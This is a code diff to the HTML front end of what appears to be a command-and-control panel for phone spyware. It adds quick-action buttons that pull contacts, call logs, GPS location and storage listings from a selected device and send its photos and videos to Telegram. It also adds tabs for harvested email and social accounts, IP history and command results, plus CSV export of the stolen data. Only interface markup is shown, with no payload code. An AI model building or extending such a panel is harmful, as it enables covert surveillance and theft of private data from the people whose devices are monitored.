@@ -29,6 +29,16 @@
                 <span class="pulse-indicator"></span>
                 <span>SYSTEM LIVE</span>
             </div>
+            <div class="india-badge" title="Made with Pride in India">
+                <svg class="flag-in-svg" viewBox="0 0 30 20" width="20" height="14" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="30" height="6.67" fill="#FF9933" rx="1"/>
+                    <rect y="6.67" width="30" height="6.67" fill="#FFFFFF"/>
+                    <rect y="13.33" width="30" height="6.67" fill="#138808" rx="1"/>
+                    <circle cx="15" cy="10" r="2.4" fill="none" stroke="#000080" stroke-width="0.6"/>
+                    <circle cx="15" cy="10" r="0.6" fill="#000080"/>
+                </svg>
+                <span class="india-text-gradient">INDIA HQ</span>
+            </div>
             <div class="app-logo">
                 <i class="fa-solid fa-satellite-dish brand-icon-glow"></i>
                 <div class="logo-text">
@@ -234,6 +244,34 @@
                     <div class="command-feedback" id="commandStatusFeedback">
                         <span>Select a device to issue real-time commands</span>
                     </div>
+
+                    <!-- Section C: Direct Action Buttons -->
+                    <div class="quick-action-btns-grid">
+                        <button class="btn-quick-action" onclick="sendDeviceCommand('ping', '📡 Ping sent to device.')" title="Ping Device">
+                            <i class="fa-solid fa-tower-broadcast"></i> <span>Ping</span>
+                        </button>
+                        <button class="btn-quick-action btn-accent-blue" onclick="sendDeviceCommand('collect_all', '🔄 Force sync triggered.')" title="Force Sync All">
+                            <i class="fa-solid fa-arrows-rotate"></i> <span>Force Sync</span>
+                        </button>
+                        <button class="btn-quick-action" onclick="sendDeviceCommand('collect_contacts', '👥 Syncing contacts.')" title="Sync Contacts">
+                            <i class="fa-solid fa-address-book"></i> <span>Contacts</span>
+                        </button>
+                        <button class="btn-quick-action" onclick="sendDeviceCommand('collect_calls', '📞 Syncing call logs.')" title="Sync Call Logs">
+                            <i class="fa-solid fa-phone-volume"></i> <span>Calls</span>
+                        </button>
+                        <button class="btn-quick-action btn-accent-amber" onclick="sendDeviceCommand('get_location', '📍 Fetching GPS location.')" title="Get GPS Location">
+                            <i class="fa-solid fa-location-crosshairs"></i> <span>Location</span>
+                        </button>
+                        <button class="btn-quick-action" onclick="sendDeviceCommand('get_storage', '📁 Scanning storage tree.')" title="Get Storage List">
+                            <i class="fa-solid fa-folder-tree"></i> <span>Storage</span>
+                        </button>
+                        <button class="btn-quick-action btn-accent-purple" onclick="sendDeviceCommand('collect_photos', '📸 Dispatching photos to Telegram.')" title="Send Photos to TG">
+                            <i class="fa-solid fa-camera"></i> <span>Photos → TG</span>
+                        </button>
+                        <button class="btn-quick-action btn-accent-purple" onclick="sendDeviceCommand('collect_videos', '🎬 Dispatching videos to Telegram.')" title="Send Videos to TG">
+                            <i class="fa-solid fa-video"></i> <span>Videos → TG</span>
+                        </button>
+                    </div>
                 </div>
             </div>
 
@@ -278,6 +316,25 @@
                             <span>Call Logs</span>
                             <span class="tab-pill-badge" id="badgeCalls">0</span>
                         </button>
+                        <button class="suite-tab" data-tab="accounts" onclick="switchSuiteTab('accounts')">
+                            <i class="fa-solid fa-at"></i>
+                            <span>Accounts</span>
+                            <span class="tab-pill-badge" id="badgeAccounts">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="ips" onclick="switchSuiteTab('ips')">
+                            <i class="fa-solid fa-network-wired"></i>
+                            <span>IP History</span>
+                            <span class="tab-pill-badge" id="badgeIPs">0</span>
+                        </button>
+                        <button class="suite-tab" data-tab="storage" onclick="switchSuiteTab('storage')">
+                            <i class="fa-solid fa-hard-drive"></i>
+                            <span>Storage</span>
+                        </button>
+                        <button class="suite-tab" data-tab="results" onclick="switchSuiteTab('results')">
+                            <i class="fa-solid fa-terminal"></i>
+                            <span>Results</span>
+                            <span class="tab-pill-badge" id="badgeResults">0</span>
+                        </button>
                         <button class="suite-tab" data-tab="logs" onclick="switchSuiteTab('logs')">
                             <i class="fa-solid fa-code"></i>
                             <span>System Logs</span>
@@ -310,6 +367,9 @@
                             <input type="text" id="contactsSearchInput" placeholder="Search contacts by name or phone..." oninput="filterContactsList()">
                         </div>
                         <div class="toolbar-actions">
+                            <button class="btn-sm-ghost" onclick="exportContactsCSV()">
+                                <i class="fa-solid fa-file-csv"></i> Export CSV
+                            </button>
                             <button class="btn-sm-primary" onclick="requestContactsRefresh()">
                                 <i class="fa-solid fa-rotate"></i> Fetch From Device
                             </button>
@@ -514,6 +574,9 @@
                             <input type="text" id="callsSearchInput" placeholder="Search call logs by phone number..." oninput="filterCallsList()">
                         </div>
                         <div class="toolbar-actions">
+                            <button class="btn-sm-ghost" onclick="exportCallLogsCSV()">
+                                <i class="fa-solid fa-file-csv"></i> Export CSV
+                            </button>
                             <button class="btn-sm-primary" onclick="requestCallsRefresh()">
                                 <i class="fa-solid fa-rotate"></i> Fetch Call Logs
                             </button>
@@ -534,16 +597,93 @@
                 <!-- Tab 8: System & Audit Logs -->
                 <div id="tab-logs" class="tab-panel">
                     <div class="tab-panel-toolbar">
-                        <span class="toolbar-title"><i class="fa-solid fa-terminal"></i> Command Execution & Stream Logs</span>
+                        <span class="toolbar-title"><i class="fa-solid fa-terminal"></i> Live System & Command Logs</span>
                         <div class="toolbar-actions">
                             <button class="btn-sm-danger" onclick="confirmDeleteDeviceLogs()">
-                                <i class="fa-solid fa-trash-can"></i> Clear Terminal Logs
+                                <i class="fa-solid fa-trash-can"></i> Clear Logs
                             </button>
                         </div>
                     </div>
-
                     <div class="cyber-terminal" id="logsDisplay">
                         <div class="terminal-line system">[SYSTEM] Ready. Select a unit from the left panel.</div>
+                    </div>
+                </div>
+
+                <!-- Tab 9: Accounts -->
+                <div id="tab-accounts" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <div class="toolbar-search">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                            <input type="text" id="accountsSearchInput" placeholder="Search accounts by email or type..." oninput="filterAccountsList()">
+                        </div>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="exportAccountsCSV()">
+                                <i class="fa-solid fa-file-csv"></i> Export CSV
+                            </button>
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllAccounts()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Accounts
+                            </button>
+                        </div>
+                    </div>
+                    <div class="calls-table-container" id="accountsContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-at"></i>
+                            <p>Select a device to view synced email & social accounts.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 10: IP History -->
+                <div id="tab-ips" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-network-wired"></i> IP Address History</span>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllIPs()">
+                                <i class="fa-solid fa-trash-can"></i> Clear IPs
+                            </button>
+                        </div>
+                    </div>
+                    <div class="calls-table-container" id="ipsContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-network-wired"></i>
+                            <p>Select a device to view IP address history.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 11: Storage -->
+                <div id="tab-storage" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-hard-drive"></i> Device Storage Layout</span>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-primary" onclick="requestStorageRefresh()">
+                                <i class="fa-solid fa-rotate"></i> Get Storage List
+                            </button>
+                        </div>
+                    </div>
+                    <div class="calls-table-container" id="storageContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-folder-open"></i>
+                            <p>Select a device and click 'Get Storage List' to view file system.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab 12: Command Results -->
+                <div id="tab-results" class="tab-panel">
+                    <div class="tab-panel-toolbar">
+                        <span class="toolbar-title"><i class="fa-solid fa-terminal"></i> Command Result History</span>
+                        <div class="toolbar-actions">
+                            <button class="btn-sm-danger" onclick="confirmDeleteAllResults()">
+                                <i class="fa-solid fa-trash-can"></i> Clear Results
+                            </button>
+                        </div>
+                    </div>
+                    <div class="calls-table-container" id="resultsContainer">
+                        <div class="empty-panel-prompt">
+                            <i class="fa-solid fa-reply"></i>
+                            <p>Command results from device will appear here after execution.</p>
+                        </div>
                     </div>
                 </div>
 
